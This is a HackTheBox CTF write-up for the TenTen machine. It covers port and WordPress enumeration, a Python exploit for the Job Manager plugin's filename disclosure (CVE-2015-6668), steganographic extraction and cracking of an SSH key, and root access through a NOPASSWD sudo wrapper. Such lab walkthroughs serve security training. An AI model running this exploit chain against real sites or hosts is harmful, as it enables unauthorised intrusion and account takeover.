---
title: "Walk-through of TenTen from HackTheBox"
header:
  teaser: /assets/images/2020-07-29-22-13-04.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - WordPress
  - wpscan
  - steghide
  - johntheripper
---

## Machine Information

![tenten](/assets/images/2020-07-29-22-13-04.png)

Tenten is a medium difficulty machine, that demonstrates the severity of using outdated Wordpress plugins, which is a major attack vector that exists in real life. Skills required are basic knowledge of Linux and the ability to enumerating ports and services. Skills learned include enumerating Wordpress, exploit modification, basic steganography and exploiting NOPASSWD files.

<!--more-->

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu/) |
| Link To Machine | [HTB - 008 - Medium - TenTen](https://www.hackthebox.eu/home/machines/profile/8) |
| Machine Release Date | 22nd March 2017 |
| Date I Completed It | 14th March 2020 |
| Distribution used | Kali 2020.1 – [Release Info](https://www.kali.org/news/kali-linux-2020-1-release/) |

## Initial Recon

Check for open ports with Nmap:

```text
root@kali:~/htb/machines/tenten# ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.10 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
root@kali:~/htb/machines/tenten# nmap -p$ports -v -sC -sV -oA tenten 10.10.10.10
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-14 11:49 GMT
Initiating Ping Scan at 11:49
Scanning 10.10.10.10 [4 ports]
Completed Ping Scan at 11:49, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:49
Completed Parallel DNS resolution of 1 host. at 11:49, 0.01s elapsed
Initiating SYN Stealth Scan at 11:49
Scanning 10.10.10.10 [2 ports]
Discovered open port 22/tcp on 10.10.10.10
Discovered open port 80/tcp on 10.10.10.10
Completed SYN Stealth Scan at 11:49, 0.07s elapsed (2 total ports)
Initiating Service scan at 11:49
Scanning 2 services on 10.10.10.10
Completed Service scan at 11:49, 6.11s elapsed (2 services on 1 host)
Nmap scan report for 10.10.10.10
Host is up (0.025s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)
|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)
|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.7.3
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Job Portal &#8211; Just another WordPress site
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.43 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```

Just two open ports. Check out website on port 80 first:

![tenten-port8](/assets/images/2020-07-29-22-21-50.png)

Looking around I find a user called Takis:

![tenten-takis](/assets/images/2020-07-29-22-22-20.png)

This is a WordPress site, we can try scanning it with WPScan. Note that for latest versions of WPScan you now need API token to do vulnerability checks, sign up [here](https://wpvulndb.com/users/sign_up) if you haven't got an account.

```text
root@kali:~/htb/machines/tenten# wpscan --url http://10.10.10.10 --api-token <<HIDDEN>>
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
         WordPress Security Scanner by the WPScan Team
                         Version 3.7.5
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________
[+] URL: http://10.10.10.10/
[+] Started: Sat Mar 14 11:41:14 2020
Interesting Finding(s):
[+] http://10.10.10.10/
| Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
| Found By: Headers (Passive Detection)
| Confidence: 100%
<SNIP>
[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).
| Found By: Rss Generator (Passive Detection)
|  - http://10.10.10.10/index.php/feed/, <generator>https://wordpress.org/?v=4.7.3</generator>
|  - http://10.10.10.10/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.3</generator>
| [!] 45 vulnerabilities identified:
| [!] Title: WordPress 2.3-4.8.3 - Host Header Injection in Password Reset
|     References:
|      - https://wpvulndb.com/vulnerabilities/8807
|      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295
|      - https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
|      - https://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
|      - https://core.trac.wordpress.org/ticket/25239
|
| [!] Title: WordPress 2.7.0-4.7.4 - Insufficient Redirect Validation
|     Fixed in: 4.7.5
|     References:
|      - https://wpvulndb.com/vulnerabilities/8815
|      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9066
|      - https://github.com/WordPress/WordPress/commit/76d77e927bb4d0f87c7262a50e28d84e01fd2b11
|      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
<SNIP>
[+] WordPress theme in use: twentyseventeen
| Location: http://10.10.10.10/wp-content/themes/twentyseventeen/
| Last Updated: 2020-02-25T00:00:00.000Z
| Readme: http://10.10.10.10/wp-content/themes/twentyseventeen/README.txt
| [!] The version is out of date, the latest version is 2.2
| Style URL: http://10.10.10.10/wp-content/themes/twentyseventeen/style.css?ver=4.7.3
| Style Name: Twenty Seventeen
| Style URI: https://wordpress.org/themes/twentyseventeen/
| Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
| Author: the WordPress team
| Author URI: https://wordpress.org/
|
| Found By: Css Style In Homepage (Passive Detection)
|
| Version: 1.1 (80% confidence)
| Found By: Style (Passive Detection)
|  - http://10.10.10.10/wp-content/themes/twentyseventeen/style.css?ver=4.7.3, Match: 'Version: 1.1'
[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)
[i] Plugin(s) Identified:
[+] job-manager
| Location: http://10.10.10.10/wp-content/plugins/job-manager/
| Latest Version: 0.7.25 (up to date)
| Last Updated: 2015-08-25T22:44:00.000Z
| Found By: Urls In Homepage (Passive Detection)
| [!] 1 vulnerability identified:
| [!] Title: Job Manager <= 0.7.25 -  Insecure Direct Object Reference
|     References:
|      - https://wpvulndb.com/vulnerabilities/8167
|      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6668
|      - https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/       <-- check this out
|
| Version: 7.2.5 (80% confidence)
| Found By: Readme - Stable Tag (Aggressive Detection)
|  - http://10.10.10.10/wp-content/plugins/job-manager/readme.txt
[+] Enumerating Config Backups (via Passive and Aggressive Methods)
Checking Config Backups - Time: 00:00:00 <===================================================================> (21 / 21) 100.00% Time: 00:00:00
[i] No Config Backups Found.
```

Only one plugin installed, and it's vulnerable, so assume this is the attack path. Look at URL from above [here.](https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin)
This has exploit code, and explanation of how you can disclose filenames with known folders.

Looking around the site further, and I find this:

![tenten-jobs](/assets/images/2020-07-29-22-22-56.png)

Clicking on the Pen Tester link takes you to the job section, with option to apply for job and upload a file:

![tenten-job-apply](/assets/images/2020-07-29-22-23-44.png)

You can look at different sections by changing the number in the URL from 8, seems to increment each time you submit an application through the job manager plugin.

We can use curl to see what applications have been made:

## Gaining Access

```text
root@kali:~/htb/machines/tenten# for i in $(seq 1 20); do echo -n "$i: "; curl -s http://10.10.10.10/index.php/jobs/apply/$i/ | grep '<title>'; done

1: <title>Job Application: Hello world! &#8211; Job Portal</title>
2: <title>Job Application: Sample Page &#8211; Job Portal</title>
3: <title>Job Application: Auto Draft &#8211; Job Portal</title>
4: <title>Job Application &#8211; Job Portal</title>
5: <title>Job Application: Jobs Listing &#8211; Job Portal</title>
6: <title>Job Application: Job Application &#8211; Job Portal</title>
7: <title>Job Application: Register &#8211; Job Portal</title>
8: <title>Job Application: Pen Tester &#8211; Job Portal</title>
9: <title>Job Application:  &#8211; Job Portal</title>
10: <title>Job Application: Application &#8211; Job Portal</title>
11: <title>Job Application: cube &#8211; Job Portal</title>
12: <title>Job Application: Application &#8211; Job Portal</title>
13: <title>Job Application: HackerAccessGranted &#8211; Job Portal</title>
14: <title>Job Application: Application &#8211; Job Portal</title>
15: <title>Job Application: Unicorn-And-Rainbow-Main-Product-Image-500&#215;500 &#8211; Job Portal</title>
16: <title>Job Application &#8211; Job Portal</title>
17: <title>Job Application &#8211; Job Portal</title>
18: <title>Job Application &#8211; Job Portal</title>
19: <title>Job Application &#8211; Job Portal</title>
20: <title>Job Application &#8211; Job Portal</title>
```

From above we see number 13 which sounds interesting, check it out on website:

![tenten-access-granted](/assets/images/2020-07-29-22-24-55.png)

Going back to the exploit found earlier, take the example code and adjust for this scenario:

```text
root@kali:~/htb/machines/tenten# cat exploit.py
import requests
website = raw_input('Enter a vulnerable website: ')
filename = raw_input('Enter a file name: ')
filename2 = filename.replace(" ", "-")

for year in range(2016,2018):
    for i in range(1,20):
        for extension in {'doc','pdf','docx','jpg','jpeg','png'}:
            URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "/" + filename2 + "." + extension
            req = requests.get(URL)
            if req.status_code==200:
                print "[+] URL of CV found! " + URL
```

Now run it and see what it finds:

```text
root@kali:~/htb/machines/tenten# python2 ./exploit.py
Enter a vulnerable website: http://10.10.10.10
Enter a file name: HackerAccessGranted
[+] URL of CV found! http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
```

Get file and have a look at it:

```text
root@kali:~/htb/machines/tenten# wget http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
--2020-03-15 17:48:47--  http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
Connecting to 10.10.10.10:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 262408 (256K) [image/jpeg]
Saving to: ‘HackerAccessGranted.jpg’
HackerAccessGranted.jpg                             100%[=================================================================================================================>] 256.26K  1.42MB/s    in 0.2s
2020-03-15 17:48:47 (1.42 MB/s) - ‘HackerAccessGranted.jpg’ saved [262408/262408]

root@kali:~/htb/machines/tenten# file HackerAccessGranted.jpg
HackerAccessGranted.jpg: JPEG image data, JFIF standard 1.01, resolution (DPCM), density 29x29, segment length 16, baseline, precision 8, 1500x1001, components 3
```

This is an image file, we can see if anything is hidden inside it:

```text
root@kali:~/htb/machines/tenten# apt-get install steghide
Reading package lists... Done
Building dependency tree
Reading state information... Done
The following additional packages will be installed:
  libmcrypt4 libmhash2
The following NEW packages will be installed:
  libmcrypt4 libmhash2 steghide
0 upgraded, 3 newly installed, 0 to remove and 1389 not upgraded.
Need to get 309 kB of archives.
After this operation, 896 kB of additional disk space will be used.
Do you want to continue? [Y/n] y
Get:1 http://ftp.hands.com/kali kali-rolling/main amd64 libmcrypt4 amd64 2.5.8-3.4+b1 [73.3 kB]
Get:2 http://ftp.hands.com/kali kali-rolling/main amd64 libmhash2 amd64 0.9.9.9-7.1 [93.7 kB]
Get:3 http://ftp.hands.com/kali kali-rolling/main amd64 steghide amd64 0.5.1-14 [142 kB]
Fetched 309 kB in 1s (308 kB/s)
Selecting previously unselected package libmcrypt4.
(Reading database ... 462349 files and directories currently installed.)
Preparing to unpack .../libmcrypt4_2.5.8-3.4+b1_amd64.deb ...
Unpacking libmcrypt4 (2.5.8-3.4+b1) ...
Selecting previously unselected package libmhash2:amd64.
Preparing to unpack .../libmhash2_0.9.9.9-7.1_amd64.deb ...
Unpacking libmhash2:amd64 (0.9.9.9-7.1) ...
Selecting previously unselected package steghide.
Preparing to unpack .../steghide_0.5.1-14_amd64.deb ...
Unpacking steghide (0.5.1-14) ...
Setting up libmhash2:amd64 (0.9.9.9-7.1) ...
Setting up libmcrypt4 (2.5.8-3.4+b1) ...
Setting up steghide (0.5.1-14) ...
Processing triggers for man-db (2.8.5-2) ...
Processing triggers for libc-bin (2.29-3) ...
root@kali:~/htb/machines/tenten# apt autoremove
Reading package lists... Done
Building dependency tree
Reading state information... Done
The following packages will be REMOVED:
  dh-python libcodec2-0.8.1 libcrystalhd3 libfluidsynth1 libigdgmm9
0 upgraded, 0 newly installed, 5 to remove and 1387 not upgraded.
After this operation, 1,870 kB disk space will be freed.
Do you want to continue? [Y/n]
(Reading database ... 462380 files and directories currently installed.)
Removing dh-python (4.20190722) ...
Removing libcodec2-0.8.1:amd64 (0.8.1-2) ...
Removing libcrystalhd3:amd64 (1:0.0~git20110715.fdd2f19-13) ...
Removing libfluidsynth1:amd64 (1.1.11-1+b1) ...
Removing libigdgmm9:amd64 (19.2.3+ds1-2) ...
Processing triggers for man-db (2.8.5-2) ...
Processing triggers for libc-bin (2.29-3) ...

root@kali:~/htb/machines/tenten# steghide extract -sf HackerAccessGranted.jpg
Enter passphrase:
wrote extracted data to "id_rsa".
```

## Initial Shell

We find it has an ssh rsa key hidden inside:

```text
root@kali:~/htb/machines/tenten# file id_rsa
id_rsa: PEM RSA private key

root@kali:~/htb/machines/tenten# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,7265FC656C429769E4C1EEFC618E660C
/HXcUBOT3JhzblH7uF9Vh7faa76XHIdr/Ch0pDnJunjdmLS/laq1kulQ3/RF/Vax
tjTzj/V5hBEcL5GcHv3esrODlS0jhML53lAprkpawfbvwbR+XxFIJuz7zLfd/vDo
1KuGrCrRRsipkyae5KiqlC137bmWK9aE/4c5X2yfVTOEeODdW0rAoTzGufWtThZf
K2ny0iTGPndD7LMdm/o5O5As+ChDYFNphV1XDgfDzHgonKMC4iES7Jk8Gz20PJsm
SdWCazF6pIEqhI4NQrnkd8kmKqzkpfWqZDz3+g6f49GYf97aM5TQgTday2oFqoXH
WPhK3Cm0tMGqLZA01+oNuwXS0H53t9FG7GqU31wj7nAGWBpfGodGwedYde4zlOBP
VbNulRMKOkErv/NCiGVRcK6k5Qtdbwforh+6bMjmKE6QvMXbesZtQ0gC9SJZ3lMT
J0IY838HQZgOsSw1jDrxuPV2DUIYFR0W3kQrDVUym0BoxOwOf/MlTxvrC2wvbHqw
AAniuEotb9oaz/Pfau3OO/DVzYkqI99VDX/YBIxd168qqZbXsM9s/aMCdVg7TJ1g
2gxElpV7U9kxil/RNdx5UASFpvFslmOn7CTZ6N44xiatQUHyV1NgpNCyjfEMzXMo
6FtWaVqbGStax1iMRC198Z0cRkX2VoTvTlhQw74rSPGPMEH+OSFksXp7Se/wCDMA
pYZASVxl6oNWQK+pAj5z4WhaBSBEr8ZVmFfykuh4lo7Tsnxa9WNoWXo6X0FSOPMk
tNpBbPPq15+M+dSZaObad9E/MnvBfaSKlvkn4epkB7n0VkO1ssLcecfxi+bWnGPm
KowyqU6iuF28w1J9BtowgnWrUgtlqubmk0wkf+l08ig7koMyT9KfZegR7oF92xE9
4IWDTxfLy75o1DH0Rrm0f77D4HvNC2qQ0dYHkApd1dk4blcb71Fi5WF1B3RruygF
2GSreByXn5g915Ya82uC3O+ST5QBeY2pT8Bk2D6Ikmt6uIlLno0Skr3v9r6JT5J7
L0UtMgdUqf+35+cA70L/wIlP0E04U0aaGpscDg059DL88dzvIhyHg4Tlfd9xWtQS
VxMzURTwEZ43jSxX94PLlwcxzLV6FfRVAKdbi6kACsgVeULiI+yAfPjIIyV0m1kv
5HV/bYJvVatGtmkNuMtuK7NOH8iE7kCDxCnPnPZa0nWoHDk4yd50RlzznkPna74r
Xbo9FdNeLNmER/7GGdQARkpd52Uur08fIJW2wyS1bdgbBgw/G+puFAR8z7ipgj4W
p9LoYqiuxaEbiD5zUzeOtKAKL/nfmzK82zbdPxMrv7TvHUSSWEUC4O9QKiB3amgf
yWMjw3otH+ZLnBmy/fS6IVQ5OnV6rVhQ7+LRKe+qlYidzfp19lIL8UidbsBfWAzB
9Xk0sH5c1NQT6spo/nQM3UNIkkn+a7zKPJmetHsO4Ob3xKLiSpw5f35SRV+rF+mO
vIUE1/YssXMO7TK6iBIXCuuOUtOpGiLxNVRIaJvbGmazLWCSyptk5fJhPLkhuK+J
YoZn9FNAuRiYFL3rw+6qol+KoqzoPJJek6WHRy8OSE+8Dz1ysTLIPB6tGKn7EWnP
-----END RSA PRIVATE KEY-----
```

The file is encrypted, let's try JohnTheRipper to crack it:

```text
root@kali:~/htb/machines/tenten# curl -sk https://raw.githubusercontent.com/truongkma/ctf-tools/master/John/run/sshng2john.py > sshng2john.py

root@kali:~/htb/machines/tenten# python sshng2john.py id_rsa > id_rsa.encrypted
root@kali:~/htb/machines/tenten# file id_rsa.encrypted
id_rsa.encrypted: ASCII text, with very long lines

root@kali:~/htb/machines/tenten# locate rockyou.txt
/usr/share/wordlists/rockyou.txt.gz

root@kali:~/htb/machines/tenten# gunzip /usr/share/wordlists/rockyou.txt.gz

root@kali:~/htb/machines/tenten# john id_rsa.encrypted --wordlist=/usr/share/wordlists/rockyou.txt
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
superpassword    (id_rsa)
1g 0:00:00:05 DONE (2020-03-15 17:58) 0.1876g/s 2690Kp/s 2690Kc/s 2690KC/sa6_123..*7¡Vamos!
Session completed
```

Found password for ssh private key, now try to connect:

```text
root@kali:~/htb/machines/tenten# chmod 600 id_rsa

root@kali:~/htb/machines/tenten# ssh -i id_rsa root@10.10.10.10
Enter passphrase for key 'id_rsa':
root@10.10.10.10's password:
root@10.10.10.10: Permission denied (publickey,password).
```

## User Flag

Tried password from above, doesn't work, try for other user we found earlier:

```text
root@kali:~/htb/machines/tenten# ssh -i id_rsa takis@10.10.10.10
The authenticity of host '10.10.10.10 (10.10.10.10)' can't be established.
ECDSA key fingerprint is SHA256:AxKIYOMkqGk3v+ZKgHEM6QcEDw8c8/qi1l0CMNSx8uQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.10' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa':   <- enter password from above here: superpassword
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
65 packages can be updated.
39 updates are security updates.
Last login: Fri May  5 23:05:36 2017

takis@tenten:~$ id
uid=1000(takis) gid=1000(takis) groups=1000(takis),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),117(lpadmin),118(sambashare)

takis@tenten:~$ ls
user.txt

takis@tenten:~$ cat user.txt
takis@tenten:~$ <<HIDDEN>>
```

## Privilege Escalation

Now we need to escalate to root. One of the first things I check is sudo for the user I'm logged in as:

```text
takis@tenten:~$ sudo -l
Matching Defaults entries for takis on tenten:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User takis may run the following commands on tenten:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/fuckin
```

Shows this user takis can run the file /bin/fuckin as root, see what it is:

```text
takis@tenten:~$ cat /bin/fuckin
#!/bin/bash
$1 $2 $3 $4
```

## Root Flag

Script that just executes the parameters passed to it, so run as root to get a shell:

```text
takis@tenten:~$ sudo /bin/fuckin bash
root@tenten:~# id
uid=0(root) gid=0(root) groups=0(root)

root@tenten:~# ls /root
root.txt

root@tenten:~# cat /root/root.txt
root@tenten:~# <<HIDDEN>>
```

All done. See you next time.
